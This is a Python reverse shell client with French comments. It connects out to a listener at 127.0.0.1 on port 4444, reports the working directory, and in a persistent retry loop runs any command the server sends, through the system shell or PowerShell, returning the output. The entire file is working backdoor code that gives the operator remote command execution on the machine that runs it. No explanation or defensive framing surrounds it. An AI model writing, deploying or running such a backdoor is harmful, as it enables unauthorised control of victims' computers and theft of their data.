import socket
import os
import subprocess
import time

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 4444
BUFFER_SIZE = 1024 * 128  # Taille max des messages
connected = False

while True:
    try:
        if not connected:
            # Création de l'objet socket
            s = socket.socket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(10)  # Définir le timeout

            # Tentative de connexion au serveur
            s.connect((SERVER_HOST, SERVER_PORT))
            print(f"[*] Connecté à {SERVER_HOST}:{SERVER_PORT}")
            connected = True  # Marquer la connexion comme réussie

            # Envoi du répertoire de travail actuel au serveur
            cwd = os.getcwd()
            s.sendall(cwd.encode())

        # Boucle pour recevoir et traiter les commandes du serveur
        while connected:
            # Réception de la commande du serveur
            command = s.recv(BUFFER_SIZE).decode()
            splited_command = command.split()

            # Gestion de la commande "exit"
            if command.lower() == "exit":
                connected = False
                break

            # Gestion de la commande "powershell"
            if command.lower() == "powershell":
                while connected:
                    shell_command = s.recv(BUFFER_SIZE).decode()
                    splited_shell = shell_command.split()
                    if shell_command.lower() == "exit":
                        break

                    elif splited_shell[0].lower() == "cd":
                        if len(splited_shell) == 1:
                            output = ""
                        else:
                            try:
                                os.chdir(' '.join(splited_shell[1:]))
                                output = ""
                            except FileNotFoundError as e:
                                output = str(e)

                        cwd = os.getcwd()
                        message = str(cwd)
                        s.sendall(message.encode())
                        continue

                    try:
                        output = subprocess.getoutput(f"powershell.exe {shell_command}")
                    except Exception as e:
                        output = f"Erreur : {str(e)}"

                    if output == '':
                        s.sendall("It's worked".encode())
                    else:
                        s.sendall(output.encode())

            # Gestion de la commande "cd"
            elif splited_command[0].lower() == "cd":
                if len(splited_command) == 1:
                    output = ""
                else:
                    try:
                        os.chdir(' '.join(splited_command[1:]))
                        output = ""
                    except FileNotFoundError as e:
                        output = str(e)

                cwd = os.getcwd()
                message = f"{output}\n{cwd}"
                s.sendall(message.encode())

            else:
                try:
                    if command.lower().endswith(".exe") or command.lower().startswith("start"):
                        subprocess.Popen(command, shell=True)
                        output = "Processus démarré sur le Client-PC"
                    else:
                            output = subprocess.getoutput(command)
                except Exception as e:
                    output = f"Erreur : {str(e)}"
                if output == '':
                    s.sendall("It's worked".encode())
                else:
                    s.sendall(output.encode())
                

    except Exception as e:
        if not connected:
            print(f"Server_state : {e} | Retrying...")
            continue
    
            
